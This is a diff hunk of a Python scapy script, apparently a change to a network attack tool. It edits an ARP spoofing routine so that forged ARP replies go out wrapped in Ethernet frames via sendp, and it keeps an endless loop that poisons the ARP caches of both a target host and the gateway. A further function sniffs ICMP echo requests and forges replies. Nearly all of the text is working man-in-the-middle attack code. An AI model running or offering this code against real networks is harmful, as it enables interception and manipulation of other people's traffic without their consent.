@@ -13,43 +13,43 @@ def get_mac(ip):
     arp_request = scapy.ARP(pdst = ip)
     broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
+    answered_list = scapy.srp(arp_request_broadcast, 
+                                timeout = 5, 
+                                verbose = False)[0]
     return answered_list[0][1].hwsrc
 
 
 """---------------------------sends a spoofed ARP packet to the target device"""
 def spoof(target_ip, spoof_ip):
-	packet = scapy.ARP(op = 2, 
-                        pdst = target_ip, 
-                        hwdst = get_mac(target_ip), 
-                        psrc = spoof_ip)
-	scapy.send(packet, verbose = False)
-	time.sleep(1)
+    packet = scapy.Ether(dst=get_mac(target_ip)) / scapy.ARP(op = 2, 
+                            pdst = target_ip, 
+                            hwdst = get_mac(target_ip),
+                            psrc = spoof_ip)
+    scapy.sendp(packet, verbose = False)
+    time.sleep(1)
 	
  
 """sends continuously sends spoofed ARP packets to the target and the gateway"""
 def arp_spoof():
     sent_packets_count = 0
-    while True:                                         # keep sending ARP spoofing packets until interrupted
-        spoof(target_ip, gateway_ip)                    # send an ARP spoofing packet to the victim device
-        spoof(gateway_ip, target_ip)                    # send an ARP spoofing packet to the gateway
-        sent_packets_count = sent_packets_count + 2     # two packets sent
+    while True:                                         
+        spoof(target_ip, gateway_ip)                    
+        spoof(gateway_ip, target_ip)                    
+        sent_packets_count = sent_packets_count + 2    
         print("\r[*] Packets Sent "+str(sent_packets_count), end="")
 
 """--------------------------------------sends an ICMP response to the source"""
-def send_icmp_response(packet):
-	resp = scapy.IP(dst=packet[IP].src,                     # Create the ICMP response packet
+def send_icmp_response(packet):  # Create the ICMP response packet
+    resp = scapy.IP(dst=packet[IP].src, 
                     src=packet[IP].dst)/scapy.ICMP(type='echo-reply', 
                     id=packet[scapy.ICMP].id, 
                     seq=packet[scapy.ICMP].seq)/packet[scapy.ICMP].payload
-	scapy.send(resp , verbose = False)         # Send the response
-	"""resp.show()"""
+    scapy.send(resp , verbose = False)       
 
 
 def sniff_icmp(packet):
 	if scapy.ICMP in packet and packet[scapy.ICMP].type == 8:
 		send_icmp_response(packet)
-		"""packet.show()"""
 
 
 def packet_sniffer():
